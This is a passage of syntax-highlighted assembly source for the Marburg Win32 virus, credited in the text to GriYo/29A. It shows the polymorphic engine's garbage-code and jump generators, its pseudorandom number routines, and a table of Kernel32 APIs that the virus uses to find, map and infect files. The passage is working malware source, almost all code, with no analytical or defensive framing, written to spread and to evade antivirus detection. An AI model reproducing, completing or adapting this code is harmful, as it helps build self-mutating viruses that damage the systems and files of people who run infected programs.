                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_math_work</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathregimm8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_math8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_math_work</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000002h</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">a_math8</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_math_work</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_math_imm</span><span class="sc4">-</span><span class="sc5">tbl_math_imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">tbl_math_imm</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate push reg + garbage + pop reg</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_push_g_pop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Note that garbage generator can call itself in a</span><span class="sc0">
                </span><span class="sc1">;recursive way, so structures like the following</span><span class="sc0">
                </span><span class="sc1">;example can be produced</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;       push reg_1</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       push reg_2</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       pop reg_2</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       pop reg_1</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate unconditional jumps</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_jump_u</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate conditional jumps</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_jump_c</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate one byte garbage code that does not change reg values</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_save_code</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_save_code</span><span class="sc4">-</span><span class="sc5">tbl_save_code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_save_code</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Initialize register table</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">init_poly</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;We can call this routine from lots of places, so</span><span class="sc0">
                </span><span class="sc1">;take care about direction flag</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc1">;Initialize random number generator</span><span class="sc0">
                </span><span class="sc1">;Use current day + hour as seed</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time_day</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Initialize register table</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_startup</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
</span><span class="sc5">loop_init_regs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_init_regs</span><span class="sc0">

                </span><span class="sc1">;Clear recursive level counter</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get a ramdom reg</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_rnd_reg</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get a ramdom reg (avoid REG_READ_ONLY, REG_IS_COUNTER and REG_IS_INDEX)</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_valid_reg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">REG_IS_INDEX</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">REG_IS_COUNTER</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">REG_READ_ONLY</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Load ecx with crypt_size / oper_size</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">fixed_size2ecx</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc4">-</span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_2ecx</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_2ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ok_2ecx</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate a block of random data</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_rnd_block</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Generate up to 27 random bytes</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">rnd_fill_loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Fill loop, get random dword </span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rnd_fill_loop</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Linear congruent pseudorandom number generator</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_rnd32</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Returns a random num between 0 and entry eax</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_rnd_range</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">  
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Virus initialized data</span><span class="sc0">

                </span><span class="sc1">;Copyright notice</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"[ Marburg ViRuS BioCoded by GriYo/29A ]"</span><span class="sc0">

                </span><span class="sc1">;Array of RVAs to function names</span><span class="sc0">

</span><span class="sc5">viral_functions</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCreateFileA</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCreateFileMap</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMapViewOfFile</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szUnmapView</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCloseHandle</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szFindFirst</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szFindNext</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szFindClose</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szVirtualAlloc</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szGetWinDir</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szGetSysDir</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szGetCurDir</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szSetFileAttr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szSetFileTime</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szDeleteFile</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szGetCurProc</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWriteProcMem</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szLoadLibrary</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szGetSysTime</span><span class="sc0">

</span><span class="sc5">viral_tbl_end</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc1">;Names of modules used by the virus</span><span class="sc0">

</span><span class="sc5">szKernel32</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"KERNEL32.dll"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szUSER32</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"USER32.dll"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;Kernel32 APIs used by the virus</span><span class="sc0">

</span><span class="sc5">szGetModuleH</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleHandleA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szGetProcAddr</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szCreateFileA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szCreateFileMap</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szMapViewOfFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szUnmapView</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szCloseHandle</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szFindFirst</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szFindNext</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szFindClose</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szVirtualAlloc</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"VirtualAlloc"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szGetWinDir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
